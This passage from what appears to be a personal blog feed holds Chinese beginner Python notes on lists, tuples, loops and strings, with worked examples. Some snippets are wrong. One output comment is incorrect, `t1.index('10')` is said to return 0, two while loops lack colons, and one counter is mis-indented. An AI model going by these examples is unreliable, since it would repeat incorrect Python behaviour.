class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">num_list=[1,4,6,2,7,3]</span><br><span class="line">num_list.sort()</span><br><span class="line">print(num_list)#[1, 2, 3, 4, 6, 7]</span><br><span class="line"></span><br><span class="line">num_list.sort(reverse=True)</span><br><span class="line">print(num_list)#[7, 6, 4, 3, 2, 1]</span><br></pre></td></tr></table></figure><h4 id="copy"><a href="#copy" class="headerlink" title="copy()"></a>copy()</h4><blockquote><p>拷贝</p></blockquote><blockquote><p>语法：列表序列.copy</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#数据很重要，操作前要记得备份一份原始数据</span><br><span class="line">name_list1=[&apos;Yang1k&apos;,&apos;mutou&apos;,&apos;luobo&apos;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">name_list2=name_list1.copy()</span><br><span class="line"></span><br><span class="line">print(name_list1)</span><br><span class="line">print(name_list2)</span><br><span class="line"></span><br><span class="line"># [&apos;Yang1k&apos;, &apos;mutou&apos;, &apos;luobo&apos;]</span><br><span class="line"># [&apos;Yang1k&apos;, &apos;mutou&apos;, &apos;luobo&apos;]</span><br></pre></td></tr></table></figure><h2 id="列表循环遍历"><a href="#列表循环遍历" class="headerlink" title="列表循环遍历"></a>列表循环遍历</h2><blockquote><p>一次性访问列表的每个数据</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#while</span><br><span class="line">name_list=[&apos;Yang1k&apos;,&apos;mutou&apos;,&apos;luobo&apos;]</span><br><span class="line">i=0</span><br><span class="line">while i&lt;len(name_list):</span><br><span class="line">    print(name_list[i])</span><br><span class="line">    i+=1</span><br><span class="line">    </span><br><span class="line">  # Yang1k</span><br><span class="line">    # mutou</span><br><span class="line">    # luobo</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#for</span><br><span class="line">name_list=[&apos;Yang1k&apos;,&apos;mutou&apos;,&apos;luobo&apos;]</span><br><span class="line"></span><br><span class="line">for i in name_list:</span><br><span class="line">    print(i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> # Yang1k</span><br><span class="line">    # mutou</span><br><span class="line">    # luobo</span><br></pre></td></tr></table></figure><h2 id="列表嵌套"><a href="#列表嵌套" class="headerlink" title="列表嵌套"></a>列表嵌套</h2><blockquote><p>列表里包含着其它子列表</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">name_list=[[&apos;小明&apos;,&apos;小红&apos;,&apos;小兰&apos;],[&apos;Yang1k&apos;,&apos;mutou&apos;,&apos;luobo&apos;],[&apos;aaa&apos;,&apos;bbb&apos;,&apos;ccc&apos;]]</span><br><span class="line">#找到 luobo</span><br><span class="line"></span><br><span class="line">#第一步:按下标找到luobo在的列表</span><br><span class="line">print(name_list[1])#[&apos;Yang1k&apos;, &apos;mutou&apos;, &apos;luobo&apos;]</span><br><span class="line">#第二步:从luobo在的列表，再按下标找到数据找到luobo</span><br><span class="line">print(name_list[1][2])#luobo</span><br></pre></td></tr></table></figure><h2 id="随机分配办公室"><a href="#随机分配办公室" class="headerlink" title="随机分配办公室"></a>随机分配办公室</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">    # 1.需求: 8位老师， 3个办公室，将8位老师随机分配到3个办公室2</span><br><span class="line">    #</span><br><span class="line">    #   步骤:</span><br><span class="line">    #   1.：准备数据</span><br><span class="line">    #   1.1： 8位老师-- 列表</span><br><span class="line">    #   1.2 ：3个办公室-列表联套</span><br><span class="line">    #</span><br><span class="line">    #   2.分配老师到办公有</span><br><span class="line">    #   ***随机分配</span><br><span class="line">    #   就是把老师的名字写入到办公室列表--办公在列表追加老师务产数据</span><br><span class="line">    #   3.总证是否分配成功</span><br><span class="line">    #   打印办公金详细信息:每个办公室的人数和对应的老师名字</span><br><span class="line"></span><br><span class="line">import random</span><br><span class="line"># 1.准备数据</span><br><span class="line">teachers=[&apos;A&apos;,&apos;B&apos;,&apos;C&apos;, &apos;D&apos;,&apos;E&apos;,&apos;F&apos;,&apos;G&apos;,&apos;H&apos;]</span><br><span class="line">offices = [[], [],[]]</span><br><span class="line"># 2.分配老师到办公室-- 取到每个老师放到办公室列表--遍历老师列表数据</span><br><span class="line">for name in teachers:</span><br><span class="line">#列表追加数据-- append (选中) extend insert</span><br><span class="line"># xx[0] --不能指定是具体某个下标--随机</span><br><span class="line">    num = random.randint(0,2)</span><br><span class="line">    offices[num].append(name)</span><br><span class="line">#print(num)</span><br><span class="line">#print(offices)</span><br><span class="line"></span><br><span class="line"># 为了更贴合生活，把各个办公室子列表加一个办公室编号1. 2， 3</span><br><span class="line">i=1</span><br><span class="line"># 3.验证是否分配成功</span><br><span class="line">for office in offices:</span><br><span class="line"># 打印办公室人数-- 子列表数据的个数 len()</span><br><span class="line">    print(f&apos;办公室&#123;i&#125;的人数是&#123;len(office)&#125;，老师分别是: &apos;)  # 打印老师的名字</span><br><span class="line"># print( ) --  每仁子列表里面的名字个数不一定--遍历--子列表</span><br><span class="line">    for name in office:</span><br><span class="line">        print(name)</span><br><span class="line">i += 1</span><br></pre></td></tr></table></figure><h1 id="元组"><a href="#元组" class="headerlink" title="元组"></a>元组</h1><blockquote><p>一次性可以存储多个数据，但同列表不同的是  数据不可以修改</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">num_list = (10, 20, 30)</span><br><span class="line">print(num_list[2])#30</span><br><span class="line">print(type(num_list))#&lt;class &apos;tuple&apos;&gt;</span><br><span class="line">num_list[0] = 100  #TypeError: &apos;tuple&apos; object does not support item assignment</span><br></pre></td></tr></table></figure><blockquote><p>但是元组里如果有列表，修改列表里面的数据则是支持的，故自觉很重要</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">tuple2 = (10, 20,[&apos;aaaa&apos;,&apos;bbbbb&apos;,&apos;ccccc&apos;],30)</span><br><span class="line"></span><br><span class="line">print(tuple2)#(10, 20, [&apos;aaaa&apos;, &apos;bbbbb&apos;, &apos;ccccc&apos;], 30)</span><br><span class="line"></span><br><span class="line">tuple2[2][1]=&apos;a&apos;</span><br><span class="line">print(tuple2)#(10, 20, [&apos;aaaa&apos;, &apos;a&apos;, &apos;ccccc&apos;], 30)</span><br></pre></td></tr></table></figure><h2 id="定义数组："><a href="#定义数组：" class="headerlink" title="定义数组："></a>定义数组：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#多个数据元组定义</span><br><span class="line">t1=(10,20,&apos;aa&apos;)</span><br><span class="line">print(type(t1))# &lt;class &apos;tuple&apos;&gt;</span><br><span class="line">#单个数据元组定义</span><br><span class="line">t2=(50,)</span><br><span class="line">print(type(t2))# &lt;class &apos;tuple&apos;&gt;</span><br><span class="line">#必须加个逗号，否则数据类型就变成单个数据的类型的类型</span><br><span class="line">t3=(50)</span><br><span class="line">print(type(t3))# &lt;class &apos;int&apos;&gt;</span><br></pre></td></tr></table></figure><p>##常用操作:查</p><blockquote><p>因为元组为不可变类型，所以只有 查 操作</p></blockquote><h3 id="index-1"><a href="#index-1" class="headerlink" title="index()"></a>index()</h3><blockquote><p>查找某个数据，如果数据存在，返回对应的的下标，否则报错，语法和列表，字符串的index方法相同。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">t1= (10, 20, &apos;bb&apos;)</span><br><span class="line">print(t1.index(&apos;10&apos;))#0</span><br><span class="line">print(t1.index(&apos;bb&apos;))#2</span><br><span class="line">print(t1.index(&apos;aa&apos;))</span><br><span class="line">#ValueError: tuple.index(x): x not in tuple</span><br></pre></td></tr></table></figure><h3 id="count-len"><a href="#count-len" class="headerlink" title="count() len()"></a>count() len()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">count()：返回某个数据在元组中几次</span><br><span class="line">len()：返回元组总共有几个数据</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">t1= (10, 20, &apos;bb&apos;,[&apos;a&apos;,&apos;b&apos;,&apos;c&apos;,&apos;bb&apos;])</span><br><span class="line">print(t1.count(&apos;bb&apos;))#1</span><br><span class="line">print(len(t1))#4</span><br></pre></td></tr></table></figure><p>最后，赵丽颖镇楼！<br><img src="https://s2.ax1x.com/2019/09/19/nOsgw4.jpg" alt="nOsgw4.jpg"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;稳住，我可以的！今天学了脱壳，明天正确把De1CTF的Re_Sign给做出来！&lt;/p&gt;
    
    </summary>
    
    
      <category term="python" scheme="http://yoursite.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>python系统学习2</title>
    <link href="http://yoursite.com/2019/09/19/python%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A02/"/>
    <id>http://yoursite.com/2019/09/19/python系统学习2/</id>
    <published>2019-09-18T16:03:35.000Z</published>
    <updated>2019-09-19T16:00:41.976Z</updated>
    
    <content type="html"><![CDATA[<p>迷茫了快，不能这个样子！</p><a id="more"></a><h2 id="三目运算符"><a href="#三目运算符" class="headerlink" title="三目运算符"></a>三目运算符</h2><blockquote><p>三目运算符也叫三元运算符或三元表达式</p></blockquote><blockquote><p>语法：条件成立时的表达式 if 条件 else 条件不成立执行的表达式</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a=1</span><br><span class="line">b=2</span><br><span class="line"></span><br><span class="line">c=a if a&gt;b else b</span><br><span class="line">print (c)#3</span><br></pre></td></tr></table></figure><h1 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h1><h2 id="while-循环"><a href="#while-循环" class="headerlink" title="while 循环"></a>while 循环</h2><blockquote><p>while语法</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">while 条件:</span><br><span class="line">    条件成立重复执行的代码1</span><br><span class="line">    条件成立重复执行的代码2</span><br><span class="line">    ......</span><br></pre></td></tr></table></figure><blockquote><p>例子：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#重复执行5遍 女朋友，我错了</span><br><span class="line">i=0</span><br><span class="line">while i&lt;5:</span><br><span class="line">    print(&quot;女朋友，我错了\n&quot;)</span><br><span class="line">    i+=1</span><br><span class="line">print (&quot;原谅你了！&quot;)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#计算1-100的累加和</span><br><span class="line">i=1</span><br><span class="line">s=0</span><br><span class="line">while i&lt;=100:</span><br><span class="line">    s+=i</span><br><span class="line">    i+=1</span><br><span class="line">print(s)#5050</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#计算1到100偶数的累加和</span><br><span class="line"></span><br><span class="line">i=2</span><br><span class="line">s=0</span><br><span class="line">while i&lt;=100:</span><br><span class="line">    s+=i</span><br><span class="line">    i+=2</span><br><span class="line">print(s)#2550</span><br><span class="line"></span><br><span class="line">#i=2</span><br><span class="line">#s=0</span><br><span class="line">#while i&lt;=100:</span><br><span class="line">#   if i%2==0:</span><br><span class="line">#        s+=i</span><br><span class="line">#   i+=1</span><br><span class="line">#print(s)#2550</span><br></pre></td></tr></table></figure><h3 id="break和continue"><a href="#break和continue" class="headerlink" title="break和continue"></a>break和continue</h3><blockquote><p>它两都是循环中满足一定退出循环的两种不同方式。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">break：终止（整个）循环</span><br><span class="line">continue：退出当前一次循环而执行下一次循环代码</span><br></pre></td></tr></table></figure><blockquote><p>举例：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#break </span><br><span class="line">i=1</span><br><span class="line">while i&lt;=5</span><br><span class="line">    if(i==4):</span><br><span class="line">        print(&quot;吃饱了，不吃了！&quot;)</span><br><span class="line">        break</span><br><span class="line">    print(f&apos;吃了第&#123;i&#125;个苹果&apos;)</span><br><span class="line">    i+=1</span><br><span class="line">    </span><br><span class="line">#吃了第1个苹果</span><br><span class="line"># 吃了第2个苹果</span><br><span class="line"># 吃了第3个苹果</span><br><span class="line"># 吃饱了，不吃了！</span><br><span class="line"></span><br><span class="line">#continue</span><br><span class="line">i=1</span><br><span class="line">while i&lt;=5</span><br><span class="line">    if(i==3):</span><br><span class="line">        print(&quot;这个苹果里面有个大虫子，这个苹果不吃了！&quot;)</span><br><span class="line">        i+=1</span><br><span class="line">        continue</span><br><span class="line">    print(f&apos;吃了第&#123;i&#125;个苹果&apos;)</span><br><span class="line">    i+=1</span><br><span class="line"></span><br><span class="line"># 吃了第1个苹果</span><br><span class="line"># 吃了第2个苹果</span><br><span class="line"># 这个苹果里面有个大虫子，这个苹果不吃了！</span><br><span class="line"># 吃了第4个苹果</span><br><span class="line"># 吃了第5个苹果</span><br></pre></td></tr></table></figure><h3 id="while-嵌套"><a href="#while-嵌套" class="headerlink" title="while 嵌套"></a>while 嵌套</h3><blockquote><p>所谓while 嵌套，就是一个while里面嵌套一个while的写法，每个while和之前的基础语法是一样的</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">j=0</span><br><span class="line">while j&lt;3:</span><br><span class="line">    i=0</span><br><span class="line">    while i&lt;3:</span><br><span class="line">        print(&apos;媳妇二，我错了&apos;)</span><br><span class="line">        i+=1</span><br><span class="line">    print(&apos;好了，原谅你了，刷晚饭的碗&apos;)</span><br><span class="line">    print(&apos;一套惩罚结束---------------&apos;)</span><br><span class="line">    j+=1</span><br><span class="line"></span><br><span class="line"># 媳妇二，我错了</span><br><span class="line"># 媳妇二，我错了</span><br><span class="line"># 媳妇二，我错了</span><br><span class="line"># 好了，原谅你了，刷晚饭的碗</span><br><span class="line"># 一套惩罚结束---------------</span><br><span class="line"># 媳妇二，我错了</span><br><span class="line"># 媳妇二，我错了</span><br><span class="line"># 媳妇二，我错了</span><br><span class="line"># 好了，原谅你了，刷晚饭的碗</span><br><span class="line"># 一套惩罚结束---------------</span><br><span class="line"># 媳妇二，我错了</span><br><span class="line"># 媳妇二，我错了</span><br><span class="line"># 媳妇二，我错了</span><br><span class="line"># 好了，原谅你了，刷晚饭的碗</span><br><span class="line"># 一套惩罚结束---------------</span><br></pre></td></tr></table></figure><blockquote><p>下面我们用while 嵌套打印  9*9乘法表</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">#打印星号（正方形）</span><br><span class="line">j=1</span><br><span class="line">while j&lt;4:</span><br><span class="line">    i=1</span><br><span class="line">    while i&lt;4:</span><br><span class="line">        print(&quot;*&quot; ,end=&quot;&quot;)</span><br><span class="line">        i+=1</span><br><span class="line">    print(&quot;&quot;)</span><br><span class="line">    j+=1</span><br><span class="line"># ***</span><br><span class="line"># ***</span><br><span class="line"># ***</span><br><span class="line"></span><br><span class="line">#打印星号（三角形）</span><br><span class="line">j=0</span><br><span class="line">while j&lt;4:</span><br><span class="line">    i=0</span><br><span class="line">    while i&lt;=j: #行和列 形成关系</span><br><span class="line">        print(&quot;*&quot; ,end=&quot;&quot;)</span><br><span class="line">        i+=1</span><br><span class="line">    print(&quot;&quot;)</span><br><span class="line">    j+=1</span><br><span class="line"># *</span><br><span class="line"># **</span><br><span class="line"># ***</span><br><span class="line"># ****</span><br><span class="line"></span><br><span class="line">#来了来了，放大招了！</span><br><span class="line">j=1</span><br><span class="line">while j&lt;=9:</span><br><span class="line">    i=1</span><br><span class="line">    while i&lt;=j:</span><br><span class="line">        print(f&apos;&#123;i&#125;*&#123;j&#125;=&#123;i*j&#125;&apos;,end=&quot;\t&quot;)</span><br><span class="line">        i+=1</span><br><span class="line">    print(&quot;&quot;)</span><br><span class="line">    j+=1</span><br><span class="line"># 1*1=1</span><br><span class="line"># 1*2=2 2*2=4</span><br><span class="line"># 1*3=3 2*3=6   3*3=9</span><br><span class="line"># 1*4=4 2*4=8   3*4=12  4*4=16</span><br><span class="line"># 1*5=5 2*5=10  3*5=15  4*5=20  5*5=25</span><br><span class="line"># 1*6=6 2*6=12  3*6=18  4*6=24  5*6=30  6*6=36</span><br><span class="line"># 1*7=7 2*7=14  3*7=21  4*7=28  5*7=35  6*7=42  7*7=49</span><br><span class="line"># 1*8=8 2*8=16  3*8=24  4*8=32  5*8=40  6*8=48  7*8=56  8*8=64</span><br><span class="line"># 1*9=9 2*9=18  3*9=27  4*9=36  5*9=45  6*9=54  7*9=63  8*9=72  9*9=81</span><br></pre></td></tr></table></figure><h2 id="for-循环"><a href="#for-循环" class="headerlink" title="for 循环"></a>for 循环</h2><blockquote><p>语法</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#字符串 元组 列表... 都可以是序列</span><br><span class="line"></span><br><span class="line">for 临时变量 in 序列</span><br><span class="line">    重复执行的代码1</span><br><span class="line">    重复执行的代码2</span><br><span class="line">    ......</span><br></pre></td></tr></table></figure><blockquote><p>举例：(以及break continue在for 循环的应用)</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">str1=&quot;mutou&quot;</span><br><span class="line">for i in str1:</span><br><span class="line">    if(i==&apos;o&apos;):</span><br><span class="line">            break</span><br><span class="line">    print (i)</span><br><span class="line"># m</span><br><span class="line"># u</span><br><span class="line"># t</span><br></pre></td></tr></table></figure><blockquote><p>break 在哪的作用都是终止（整个循环）</p></blockquote><blockquote><p>comtinue 是跳过一次循环</p></blockquote><h2 id="循环配合else-配合使用"><a href="#循环配合else-配合使用" class="headerlink" title="循环配合else 配合使用"></a>循环配合else 配合使用</h2><blockquote><p>else下方缩进的代码指的是当循环正常结束之后要执行的代码</p></blockquote><blockquote><p>（循环不是正常结束的，else里面的代码是不会执行的）</p></blockquote><blockquote><p>手动说三遍！！！</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#因为 continue 是退出当前一次循环，继续下一次的循环，所以该循环在continue控制下是正常结束的，所以循环结束后，执行else里的代码</span><br><span class="line">i=1</span><br><span class="line">while i&lt;=5:</span><br><span class="line">    if i==3:</span><br><span class="line">        print(&quot;这遍说得不真诚&quot;)</span><br><span class="line">        i+=1</span><br><span class="line">        continue</span><br><span class="line">    print(&quot;女朋友，我错了&quot;)</span><br><span class="line">    i+=1</span><br><span class="line">else:</span><br><span class="line">    print(&quot;女朋友原谅我了，真开心！&quot;)</span><br><span class="line"># 女朋友，我错了</span><br><span class="line"># 女朋友，我错了</span><br><span class="line"># 这遍说得不真诚</span><br><span class="line"># 女朋友，我错了</span><br><span class="line"># 女朋友，我错了</span><br><span class="line"># 女朋友原谅我了，真开心！</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#但break  就是  属于  不正常 结束循环，不会执行else 代码块的代码</span><br><span class="line">i=1</span><br><span class="line">while i&lt;=5:</span><br><span class="line">    if i==3:</span><br><span class="line">       break</span><br><span class="line">    print(&quot;女朋友，我错了&quot;)</span><br><span class="line">    i+=1</span><br><span class="line">else:</span><br><span class="line">    print(&quot;女朋友原谅我了，真开心！&quot;)</span><br><span class="line"># 女朋友，我错了</span><br><span class="line"># 女朋友，我错了</span><br></pre></td></tr></table></figure><h3 id="for…else"><a href="#for…else" class="headerlink" title="for…else"></a>for…else</h3><blockquote><p>语法：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">for 临时变量 in 序列:</span><br><span class="line">    重复执行的代码</span><br><span class="line">    ......</span><br><span class="line">else:</span><br><span class="line">    循环正常结束之后要执行的代码</span><br></pre></td></tr></table></figure><blockquote><p>同上</p></blockquote><h1 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h1><blockquote><p>字符串是python 很重要的数据类型，用户输入都是作为字符串类型处理的</p></blockquote><h2 id="单引号，双引号，三引号"><a href="#单引号，双引号，三引号" class="headerlink" title="单引号，双引号，三引号"></a>单引号，双引号，三引号</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">a=&apos;hello&apos;</span><br><span class="line">b=&quot;I\&apos;mutou&quot;  #转义</span><br><span class="line">print(b)#I&apos;m mutou</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c=&apos;&apos;&apos;yang&apos;&apos;&apos;</span><br><span class="line">d=&quot;&quot;&quot;world&quot;&quot;&quot;</span><br><span class="line">print(type(c))#&lt;class &apos;str&apos;&gt;</span><br><span class="line">print(type(d))#&lt;class &apos;str&apos;&gt;</span><br><span class="line"></span><br><span class="line">e=&apos;hello &apos; \</span><br><span class="line">  &apos;world&apos;</span><br><span class="line">print(e)#hello world   //即换行，输出格式不变，但在 自动产生一个 &apos;\&apos;符号</span><br><span class="line"></span><br><span class="line">f=&apos;&apos;&apos;hello </span><br><span class="line">world&apos;&apos;&apos;</span><br><span class="line">print(f)</span><br><span class="line"># hello</span><br><span class="line"># world    //即换行，输出格式也相应改变</span><br></pre></td></tr></table></figure><h2 id="字符串输出"><a href="#字符串输出" class="headerlink" title="字符串输出"></a>字符串输出</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">print(&apos;hello,world&apos;)</span><br><span class="line">name=&apos;mutou&apos;</span><br><span class="line">print(&apos;我的名字是%s&apos; % name)</span><br><span class="line">print(f&apos;我的名字是&#123;name&#125;&apos;)</span><br><span class="line"></span><br><span class="line"># hello,world</span><br><span class="line"># 我的名字是mutou</span><br><span class="line"># 我的名字是mutou</span><br></pre></td></tr></table></figure><h2 id="字符串输入："><a href="#字符串输入：" class="headerlink" title="字符串输入："></a>字符串输入：</h2><blockquote><p>在Python中，使用input()接收用户输入</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">password=input(&apos;请输入您的密码：&apos;)</span><br><span class="line">print(f&apos;您输入的密码是&#123;password&#125;&apos;)</span><br><span class="line">print(type(password))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 请输入您的密码：521</span><br><span class="line"># 